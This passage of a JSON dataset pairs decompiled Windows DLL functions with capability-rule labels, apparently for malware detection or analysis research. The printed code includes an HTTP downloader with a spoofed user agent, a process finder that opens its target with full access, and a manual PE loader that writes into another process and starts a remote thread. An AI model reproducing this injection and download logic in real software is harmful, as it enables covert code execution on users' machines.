uStack2244 = 1;\n    }\n    return uStack2244;\n}\n",
        "token_count": 596
    },
    "18000880": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.180008800(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    ulong uStackX16;\n    int64_t iStackX24;\n    ulong uStackX32;\n    ulong uStack24;\n    \n    uStack24 = 0x180008820;\n    uStackX16 = arg2;\n    iStackX24._0_4_ = arg3;\n    uStackX32 = arg4;\n    iVar2 = fcn.18001df20();\n    iVar2 = -iVar2;\n    **(&stack0x00004a10 + iVar2) = 0;\n    **(&stack0x00004a18 + iVar2) = 0;\n    *(&stack0x0000005c + iVar2) = 0;\n    do {\n        puVar6 = &stack0x000000c0 + iVar2;\n        for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        puVar6 = &stack0x000001d0 + iVar2;\n        for (iVar4 = 0x800; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *(&stack0xffffffffffffffe8 + iVar2) = 0x180008892;\n        iVar1 = fcn.180008690(*(&stack0x000049f0 + iVar2), &stack0x000000c0 + iVar2, &stack0x000001d0 + iVar2, \n                              &stack0x00000030 + iVar2);\n        if ((iVar1 == 0) || (*(&stack0x00000030 + iVar2) != 0x50)) break;\n        *(&stack0x00000010 + iVar2) = 0;\n        *(&stack0xffffffffffffffe8 + iVar2) = 0x1800088c2;\n        uVar3 = (**0x18002ce48)(0, 0, 0, 0);\n        *(&stack0x00000050 + iVar2) = uVar3;\n        if (*(&stack0x00000050 + iVar2) == 0) break;\n        *(&stack0x00000040 + iVar2) = 0x4280300;\n        *(&stack0x00000028 + iVar2) = 0;\n        *(&stack0x00000020 + iVar2) = *(&stack0x00000040 + iVar2);\n        *(&stack0x00000018 + iVar2) = 3;\n        *(&stack0x00000010 + iVar2) = 0;\n        *(&stack0xffffffffffffffe8 + iVar2) = 0x18000891a;\n        uVar3 = (**0x18002ce30)(*(&stack0x00000050 + iVar2), &stack0x000000c0 + iVar2, *(&stack0x00000030 + iVar2), 0);\n        *(&stack0x00000060 + iVar2) = uVar3;\n        if (*(&stack0x00000060 + iVar2) == 0) {\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x180008932;\n            (**0x18002cd80)(*(&stack0x00000050 + iVar2));\n            break;\n        }\n        *(&stack0x00000090 + iVar2) = \"image/gif\";\n        *(&stack0x00000098 + iVar2) = \"image/jpeg\";\n        *(&stack0x000000a0 + iVar2) = \"application/x-shockwave-flash\";\n        *(&stack0x000000a8 + iVar2) = 0x180027b04;\n        *(&stack0x000000b0 + iVar2) = 0;\n        if (*(&stack0x00000030 + iVar2) == 0x1bb) {\n            *(&stack0x00000040 + iVar2) = *(&stack0x00000040 + iVar2) | 0x803000;\n        }\n        *(&stack0x00000028 + iVar2) = 0;\n        *(&stack0x00000020 + iVar2) = *(&stack0x00000040 + iVar2);\n        *(&stack0x00000018 + iVar2) = &stack0x00000090 + iVar2;\n        *(&stack0x00000010 + iVar2) = *(&stack0x00004a08 + iVar2);\n        *(&stack0xffffffffffffffe8 + iVar2) = 0x1800089e4;\n        uVar3 = (**0x18002cd18)(*(&stack0x00000060 + iVar2), \"POST\", &stack0x000001d0 + iVar2, \"HTTP/1.1\");\n        *(&stack0x00000038 + iVar2) = uVar3;\n        if (*(&stack0x00000038 + iVar2) == 0) {\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x1800089fc;\n            (**0x18002cd80)(*(&stack0x00000060 + iVar2));\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x180008a07;\n            (**0x18002cd80)(*(&stack0x00000050 + iVar2));\n            break;\n        }\n        *(&stack0x00000078 + iVar2) = 3000;\n        *(&stack0x00000070 + iVar2) = 3000;\n        *(&stack0x00000074 + iVar2) = 3000;\n        *(&stack0xffffffffffffffe8 + iVar2) = 0x180008a4b;\n        iVar1 = (**0x18002cdb0)(*(&stack0x00000038 + iVar2), 5, &stack0x00000070 + iVar2, 4);\n        if (iVar1 == 0) {\ncode_r0x000180008a93:\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x180008a9e;\n            (**0x18002cd80)(*(&stack0x00000060 + iVar2));\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x180008aa9;\n            (**0x18002cd80)(*(&stack0x00000050 + iVar2));\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x180008ab4;\n            (**0x18002cd80)(*(&stack0x00000038 + iVar2));\n            break;\n        }\n        *(&stack0xffffffffffffffe8 + iVar2) = 0x180008a6d;\n        iVar1 = (**0x18002cdb0)(*(&stack0x00000038 + iVar2), 6, &stack0x00000074 + iVar2, 4);\n        if (iVar1 == 0) goto code_r0x000180008a93;\n        *(&stack0xffffffffffffffe8 + iVar2) = 0x180008a8f;\n        iVar1 = (**0x18002cdb0)(*(&stack0x00000038 + iVar2), 2, &stack0x00000078 + iVar2, 4);\n        if (iVar1 == 0) goto code_r0x000180008a93;\n        *(&stack0x00000010 + iVar2) = *(&stack0x00004a00 + iVar2);\n        *(&stack0xffffffffffffffe8 + iVar2) = 0x180008ae4;\n        iVar1 = (**0x18002cde8)(*(&stack0x00000038 + iVar2), \"Accept-Language: en\\r\\nUser-Agent: cur1-agent\\r\\n\", \n                                0xffffffff, *(&stack0x000049f8 + iVar2));\n        if (iVar1 == 0) {\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x180008af3;\n            (**0x18002cd80)(*(&stack0x00000060 + iVar2));\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x180008afe;\n            (**0x18002cd80)(*(&stack0x00000050 + iVar2));\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x180008b09;\n            (**0x18002cd80)(*(&stack0x00000038 + iVar2));\n            break;\n        }\n        *(&stack0x00000048 + iVar2) = 0;\n        *(&stack0x0000007c + iVar2) = 4;\n        *(&stack0x00000010 + iVar2) = 0;\n        *(&stack0xffffffffffffffe8 + iVar2) = 0x180008b47;\n        iVar1 = (**0x18002ce08)(*(&stack0x00000038 + iVar2), 0x20000013, &stack0x00000048 + iVar2, \n                                &stack0x0000007c + iVar2);\n        if (iVar1 == 1) {\n            if (*(&stack0x00000048 + iVar2) == 200) {\n                puVar6 = &stack0x000009d0 + iVar2;\n                for (iVar4 = 0x4000; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                *(&stack0x00000068 + iVar2) = 0;\n                while( true ) {\n                    *(&stack0xffffffffffffffe8 + iVar2) = 0x180008b9c;\n                    iVar1 = (**0x18002cd10)(*(&stack0x00000038 + iVar2), &stack0x00000058 + iVar2, 0, 0);\n                    if ((iVar1 == 0) || (*(&stack0x00000058 + iVar2) == 0)) break;\n                    if (*(&stack0x00000058 + iVar2) < 0x4000) {\n                        *(&stack0x00000088 + iVar2) = *(&stack0x00000058 + iVar2);\n                    }\n                    else {\n                        *(&stack0x00000088 + iVar2) = 0x4000;\n                    }\n                    *(&stack0x00000080 + iVar2) = *(&stack0x00000088 + iVar2);\n                    *(&stack0xffffffffffffffe8 + iVar2) = 0x180008c05;\n                    iVar1 = (**0x18002cd08)(*(&stack0x00000038 + iVar2));\n                    if ((iVar1 == 0) || (*(&stack0x00000044 + iVar2) == 0)) break;\n                    if ((*(&stack0x00000068 + iVar2) == 0) || (**(&stack0x00004a10 + iVar2) != 0)) {\n                        if (**(&stack0x00004a10 + iVar2) != 0) {\n                            *(&stack0x00000068 + iVar2) = **(&stack0x00004a10 + iVar2);\n                        }\n                        iVar1 = **(&stack0x00004a18 + iVar2);\n                        uVar3 = **(&stack0x00004a10 + iVar2);\n                        *(&stack0xffffffffffffffe8 + iVar2) = 0x180008c75;\n                        uVar3 = fcn.180010a1c(uVar3, iVar1 + *(&stack0x00000044 + iVar2));\n                        **(&stack0x00004a10 + iVar2) = uVar3;\n                        if (**(&stack0x00004a10 + iVar2) != 0) {\n                            puVar6 = &stack0x000009d0 + iVar2;\n                            puVar7 = **(&stack0x00004a18 + iVar2) + **(&stack0x00004a10 + iVar2);\n                            for (uVar5 = *(&stack0x00000044 + iVar2); uVar5 != 0; uVar5 = uVar5 - 1) {\n                                *puVar7 = *puVar6;\n                                puVar6 = puVar6 + 1;\n                                puVar7 = puVar7 + 1;\n                            }\n                            **(&stack0x00004a18 + iVar2) = **(&stack0x00004a18 + iVar2) + *(&stack0x00000044 + iVar2);\n                        }\n                    }\n                }\n                if ((**(&stack0x00004a10 + iVar2) == 0) && (*(&stack0x00000068 + iVar2) != 0)) {\n                    **(&stack0x00004a18 + iVar2) = 0;\n                }\n            }\n            else if (((299 < *(&stack0x00000048 + iVar2)) && (*(&stack0x00000048 + iVar2) < 400)) &&\n                    (*(&stack0x00004a20 + iVar2) != 0)) {\n                *(&stack0x00000084 + iVar2) = 0x824;\n                *(&stack0x00000010 + iVar2) = 0;\n                *(&stack0xffffffffffffffe8 + iVar2) = 0x180008d4f;\n                (**0x18002cdd0)(*(&stack0x00000038 + iVar2), 0x21, *(&stack0x00004a20 + iVar2), &stack0x00000084 + iVar2\n                               );\n            }\n        }\n        else if (*(&stack0x00000038 + iVar2) != 0) {\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x180008d64;\n            (**0x18002cd80)(*(&stack0x00000038 + iVar2));\n        }\n        if (*(&stack0x00000060 + iVar2) != 0) {\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x180008d77;\n            (**0x18002cd80)(*(&stack0x00000060 + iVar2));\n        }\n        if (*(&stack0x00000050 + iVar2) != 0) {\n            *(&stack0xffffffffffffffe8 + iVar2) = 0x180008d8a;\n            (**0x18002cd80)(*(&stack0x00000050 + iVar2));\n        }\n        *(&stack0x0000005c + iVar2) = 1;\n    } while (*(&stack0x0000005c + iVar2) == 0);\n    return *(&stack0x0000005c + iVar2);\n}\n",
        "token_count": 3331
    },
    "18000f50": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.18000f50c(int64_t arg1)\n\n{\n    int64_t arg4;\n    int64_t arg1_00;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    char cVar4;\n    uint16_t uVar5;\n    ulong arg2;\n    uint *arg2_00;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    ushort uVar8;\n    int64_t arg3;\n    uchar auStack104 [32];\n    int64_t iStack72;\n    uint uStack56;\n    ushort uStack52;\n    uint64_t uStack48;\n    \n    uStack48 = *0x18002b028 ^ auStack104;\n    uVar5 = *(arg1 + 0x42);\n    uVar8 = 0x78;\n    if (uVar5 < 0x65) {\n        if (uVar5 == 100) {\ncode_r0x00018000f633:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x00018000f637:\n            arg2 = 10;\ncode_r0x00018000f63f:\n            cVar4 = fcn.18000ffc4(arg1, arg2);\n        }\n        else {\n            if (uVar5 == 0x41) goto code_r0x00018000f646;\n            if (uVar5 == 0x43) {\ncode_r0x00018000f59f:\n                cVar4 = fcn.18000fd9c(arg1);\n            }\n            else {\n                if (uVar5 < 0x45) goto code_r0x00018000f7ab;\n                if (uVar5 < 0x48) goto code_r0x00018000f646;\n                if (uVar5 == 0x53) {\ncode_r0x00018000f5ef:\n                    cVar4 = fcn.18001026c(arg1);\n                }\n                else {\n                    if (uVar5 == 0x58) goto code_r0x00018000f604;\n                    if (uVar5 != 0x5a) {\n                        if (uVar5 != 0x61) {\n                            if (uVar5 != 99) goto code_r0x00018000f7ab;\n                            goto code_r0x00018000f59f;\n                        }\n                        goto code_r0x00018000f646;\n                    }\n                    cVar4 = fcn.18000f8bc(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if (0x67 < uVar5) {\n            if (uVar5 == 0x69) goto code_r0x00018000f633;\n            if (uVar5 == 0x6e) {\n                cVar4 = fcn.18001014c(arg1);\n                goto code_r0x00018000f64b;\n            }\n            if (uVar5 == 0x6f) {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                arg2 = 8;\n            }\n            else if (uVar5 == 0x70) {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x00018000f604:\n                arg2 = 0x10;\n            }\n            else {\n                if (uVar5 == 0x73) goto code_r0x00018000f5ef;\n                if (uVar5 == 0x75) goto code_r0x00018000f637;\n                if (uVar5 != 0x78) goto code_r0x00018000f7ab;\n                arg2 = 0x10;\n            }\n            goto code_r0x00018000f63f;\n        }\ncode_r0x00018000f646:\n        cVar4 = fcn.18000faf4(arg1);\n    }\ncode_r0x00018000f64b:\n    if ((cVar4 == '\\0') || (*(arg1 + 0x40) != '\\0')) goto code_r0x00018000f7ab;\n    uVar2 = *(arg1 + 0x30);\n    uStack56 = 0;\n    uStack52 = 0;\n    arg3 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    uStack56 = 0x20;\n                    arg3 = 1;\n                }\n                goto code_r0x00018000f6b0;\n            }\n            uVar5 = 0x2b;\n        }\n        else {\n            uVar5 = 0x2d;\n        }\n        uStack56 = uVar5;\n        arg3 = 1;\n    }\ncode_r0x00018000f6b0:\n    iVar1 = *(arg1 + 0x42);\n    if (((iVar1 - 0x58U & 0xffdf) == 0) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar3) || ((iVar1 - 0x41U & 0xffdf) == 0)) {\n        *(&uStack56 + arg3 * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&uStack56 + arg3 * 2 + 2) = uVar8;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar7 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.18000e72c(arg1_00, uVar2 & 0xffffff00 | 0x20, uVar7, arg4);\n    }\n    iStack72 = arg1 + 0x10;\n    arg2_00 = &uStack56;\n    fcn.18001059c(arg1_00, arg2_00, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.18000e72c(arg1_00, arg2_00 & 0xffffffffffffff00 | 0x30, uVar7, arg4);\n    }\n    uVar6 = 0;\n    fcn.180010410(arg1);\n    if ((-1 < *(arg1 + 0x28)) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        fcn.18000e72c(arg1_00, uVar6 & 0xffffffffffffff00 | 0x20, uVar7, arg1 + 0x28);\n    }\ncode_r0x00018000f7ab:\n    fcn.18001dd90(uStack48 ^ auStack104);\n    return;\n}\n",
        "token_count": 1737
    },
    "18001064": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180010644(uint64_t arg1, uchar *arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    ulong in_stack_00000028;\n    ulong var_3b8h;\n    ulong var_3c0h;\n    ulong var_3c8h;\n    ulong var_3d0h;\n    ulong var_3e0h;\n    uchar auStack1320 [32];\n    uchar *puStack1288;\n    int64_t iStack1280;\n    int64_t iStack1272;\n    uchar uStack1264;\n    uint uStack1263;\n    ushort uStack1259;\n    uchar uStack1257;\n    int64_t iStack1256;\n    uchar auStack1248 [16];\n    char cStack1232;\n    uint64_t uStack1224;\n    uchar *puStack1216;\n    ulong uStack1208;\n    int64_t iStack1200;\n    ulong uStack1184;\n    ulong uStack1176;\n    uint uStack1168;\n    ushort uStack1160;\n    uint uStack1144;\n    uchar uStack1140;\n    ulong var_80h;\n    ulong var_78h;\n    ulong var_bp_70h;\n    ulong var_bp_68h;\n    ulong var_bp_60h;\n    uchar **ppuStack96;\n    ulong var_50h;\n    uint64_t uStack72;\n    \n    uStack72 = *0x18002b028 ^ auStack1320;\n    if ((arg4 == 0) || ((arg3 != 0 && (arg2 == NULL)))) {\n        puVar2 = fcn.18001293c();\n        *puVar2 = 0x16;\n        fcn.18001097c();\n        goto code_r0x00018000e0aa;\n    }\n    fcn.18000daa0(&iStack1256, in_stack_00000028);\n    uStack1263 = 0;\n    uStack1259 = 0;\n    uStack1257 = 0;\n    iStack1272 = 0;\n    if (((arg1 & 2) != 0) || (uStack1264 = 0,  arg2 == NULL)) {\n        uStack1264 = 1;\n    }\n    ppuStack96 = &puStack1288;\n    uStack1208 = 0;\n    puStack1216 = auStack1248;\n    uStack1184 = 0;\n    uStack1176 = 0;\n    uStack1168 = 0;\n    uStack1160 = 0;\n    uStack1144 = 0;\n    uStack1140 = 0;\n    var_bp_68h = 0;\n    var_bp_60h = 0;\n    var_50h._0_4_ = 0;\n    puStack1288 = arg2;\n    iStack1280 = arg3;\n    uStack1224 = arg1;\n    iStack1200 = arg4;\n    iVar1 = fcn.18000ea10(&uStack1224);\n    if (arg2 != NULL) {\n        if ((arg1 & 1) == 0) {\n            if ((arg1 & 2) == 0) {\n                if (arg3 != 0) {\n                    if (iStack1272 != arg3) goto code_r0x00018000e07e;\ncode_r0x00018000e0e4:\n                    arg2[arg3 + -1] = 0;\n                }\n            }\n            else if (arg3 != 0) {\n                if (-1 < iVar1) {\n                    if (iStack1272 == arg3) goto code_r0x00018000e0e4;\n                    goto code_r0x00018000e07e;\n                }\n                *arg2 = 0;\n            }\n        }\n        else if (((arg3 != 0) || (iVar1 == 0)) && (iStack1272 != arg3)) {\ncode_r0x00018000e07e:\n            arg2[iStack1272] = 0;\n        }\n    }\n    fcn.1800136b4(var_bp_60h);\n    var_bp_60h = 0;\n    if (cStack1232 != '\\0') {\n        *(iStack1256 + 0x3a8) = *(iStack1256 + 0x3a8) & 0xfffffffd;\n    }\ncode_r0x00018000e0aa:\n    fcn.18001dd90(uStack72 ^ auStack1320);\n    return;\n}\n",
        "token_count": 1028
    },
    "18001376": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.180013768(int64_t arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    uint32_t auStackX8 [2];\n    uchar auStackX16 [8];\n    uint32_t auStackX24 [2];\n    uint32_t auStackX32 [2];\n    uint32_t *apuStack24 [3];\n    \n    auStackX8[0] = arg1;\n    if (auStackX8[0] == 0xfffffffe) {\n        puVar1 = fcn.18001291c(arg1);\n        *puVar1 = 0;\n        puVar1 = fcn.18001293c();\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < auStackX8[0]) && (auStackX8[0] < *0x18002c2c0)) &&\n           (arg1 = (auStackX8[0] & 0x3f) * 9, \n           (*(*((auStackX8[0] >> 6) * 8 + 0x18002bec0) + 0x38 + (auStackX8[0] & 0x3f) * 0x48) & 1) != 0)) {\n            apuStack24[0] = auStackX8;\n            auStackX24[0] = auStackX8[0];\n            auStackX32[0] = auStackX8[0];\n            uVar2 = fcn.1800136f4(auStackX16, auStackX32, apuStack24, auStackX24);\n            return uVar2;\n        }\n        puVar1 = fcn.18001291c(arg1);\n        *puVar1 = 0;\n        puVar1 = fcn.18001293c();\n        *puVar1 = 9;\n        fcn.18001097c();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 437
    },
    "1800030f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.1800030f0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong *puVar1;\n    int32_t iStack20;\n    \n    puVar1 = fcn.1800030e0();\n    iStack20 = fcn.18001064c(*puVar1, arg1, arg2, arg3);\n    if (iStack20 < 0) {\n        iStack20 = -1;\n    }\n    return iStack20;\n}\n",
        "token_count": 114
    },
    "18000324": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.180003240(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint64_t *puVar1;\n    int32_t iStack20;\n    \n    puVar1 = fcn.1800030e0();\n    iStack20 = fcn.180010644(*puVar1 | 1, arg1, arg2, arg3);\n    if (iStack20 < 0) {\n        iStack20 = -1;\n    }\n    return iStack20;\n}\n",
        "token_count": 116
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "180003e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.180003e40(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    while (iVar1 = fcn.180010a14(arg1),  iVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return iVar1;\n}\n",
        "token_count": 69
    },
    "180003fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180003fc0(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    int32_t iStack616;\n    uint auStack584 [2];\n    int32_t iStack576;\n    uchar auStack540 [532];\n    \n    iStack616 = 0;\n    iVar2 = (**0x18002ce28)(2, 0);\n    if (iVar2 == -1) {\n        uVar3 = 0;\n    }\n    else {\n        puVar5 = auStack584;\n        for (iVar4 = 0x238; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        auStack584[0] = 0x238;\n        iVar1 = (**0x18002cd28)(iVar2, auStack584);\n        while (iVar1 != 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_CompareStringW)(0x800, 1, auStack540, 0xffffffff, 0x180027978, 0xffffffff);\n            if (iVar1 == 2) {\n                iStack616 = iStack576;\n                break;\n            }\n            iVar1 = (**0x18002cde0)(iVar2, auStack584);\n        }\n        if (iVar2 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        }\n        if (iStack616 == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = (**0x18002ce50)(0x1fffff, 0, iStack576);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 405
    },
    "1800041e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.1800041e0(uchar *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    ulong in_stack_00000028;\n    uint32_t uStack152;\n    int32_t iStack148;\n    uint64_t *puStack136;\n    uint32_t *puStack128;\n    uint32_t *puStack120;\n    uint32_t *puStack112;\n    int32_t aiStack104 [2];\n    uint64_t uStack96;\n    int64_t iStack88;\n    int64_t iStack80;\n    int64_t iStack72;\n    int64_t *piStack64;\n    uint32_t *puStack56;\n    uchar *puStack48;\n    int64_t iStack40;\n    \n    puVar6 = arg1;\n    puVar7 = 0x18002ce80;\n    for (iVar5 = 0xc4; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    if ((*0x18002ce80 == 0) || (0xf < *0x18002ce80)) {\n        uVar4 = 0;\n    }\n    else {\n        iVar5 = (**0x18002cd90)(in_stack_00000028, 0, *0x18002ce84 + 1 + arg4, 0x3000, 0x40);\n        if (iVar5 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            iVar2 = fcn.1800040c0(*0x18002ce88);\n            iVar3 = fcn.1800040c0(*0x18002ce90);\n            for (puStack128 = arg1 + iVar2; puStack112 = arg1 + iVar3,  *puStack128 != 0; puStack128 = puStack128 + 5) {\n                fcn.1800040c0(puStack128[3]);\n                iStack88 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n                if (iStack88 != 0) {\n                    iVar2 = fcn.1800040c0(*puStack128);\n                    iStack148 = 0;\n                    for (puStack136 = arg1 + iVar2; *puStack136 != 0; puStack136 = puStack136 + 1) {\n                        if ((*puStack136 & 0x8000000000000000) == 0) {\n                            iVar2 = fcn.1800040c0(*puStack136 + 2);\n                            iStack80 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iStack88, arg1 + iVar2);\n                        }\n                        else {\n                            iStack80 = (*_sym.imp.KERNEL32.dll_GetProcAddress)\n                                                 (iStack88, *puStack136 & 0xfffffffffffffff);\n                        }\n                        if (iStack80 != 0) {\n                            iVar2 = fcn.1800040c0(puStack128[4]);\n                            *(arg1 + iStack148 * 8 + iVar2) = iStack80;\n                        }\n                        iStack148 = iStack148 + 1;\n                    }\n                }\n            }\n            while (*puStack112 != 0) {\n                iVar2 = fcn.1800040c0(*puStack112);\n                puStack48 = arg1 + iVar2;\n                puStack56 = puStack112 + puStack112[1];\n                for (puStack120 = puStack112 + 2; puStack112 = puStack56,  puStack120 < puStack56;\n                    puStack120 = puStack120 + 2) {\n                    if ((*puStack120 >> 0xc == 3) || (*puStack120 >> 0xc == 10)) {\n                        piStack64 = puStack48 + (*puStack120 & 0xfff);\n                        *piStack64 = (iVar5 - *0x18002cf3c) + *piStack64;\n                    }\n                }\n            }\n            uStack96 = 0xc6;\n            uStack152 = 0;\n            while (((uStack152 < *0x18002ce80 &&\n                    (iVar1 = (**0x18002cd60)(in_stack_00000028, iVar5 + *(uStack152 * 0xc + 0x18002ce9c), \n                                             arg1 + uStack96, *(uStack152 * 0xc + 0x18002ce98), aiStack104),  iVar1 == 0\n                    )) && (aiStack104[0] == *(uStack152 * 0xc + 0x18002ce98)))) {\n                uStack96 = uStack96 + *(uStack152 * 0xc + 0x18002ce98);\n                uStack152 = uStack152 + 1;\n            }\n            (**0x18002cd60)(in_stack_00000028, iVar5 + 1 + *0x18002ce84, arg3, arg4, aiStack104);\n            if (uStack96 == arg2) {\n                iStack40 = iVar5 + *0x18002ce8c;\n                iStack72 = 0;\n                iStack72 = (**0x18002cdc8)(in_stack_00000028, 0, 0, iStack40, iVar5 + 1 + *0x18002ce84, 0, 0, 0);\n                if (iStack72 == 0) {\n                    uVar4 = 0;\n                }\n                else {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack72);\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(in_stack_00000028);\n                    uVar4 = 1;\n                }\n            }\n            else {\n                uVar4 = 0;\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 1351
    },
    "18000478": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.180004780(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uStack40;\n    uint uStack36;\n    int64_t iStack32;\n    int64_t iStack24;\n    \n    iStack32 = fcn.180003e40((arg2 - 2) / 2);\n    uStack40 = 0;\n    fcn.180003f30(arg1, arg2, iStack32, &uStack40);\n    iStack24 = fcn.180003fc0();\n    if (iStack24 == 0) {\n        uStack36 = 0;\n    }\n    else {\n        uStack36 = fcn.1800041e0(iStack32, uStack40, arg3, arg4);\n        if (iStack32 != 0) {\n            fcn.180010754(iStack32);\n        }\n    }\n    return uStack36;\n}\n",
        "token_count": 208
    },
    "18000483": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
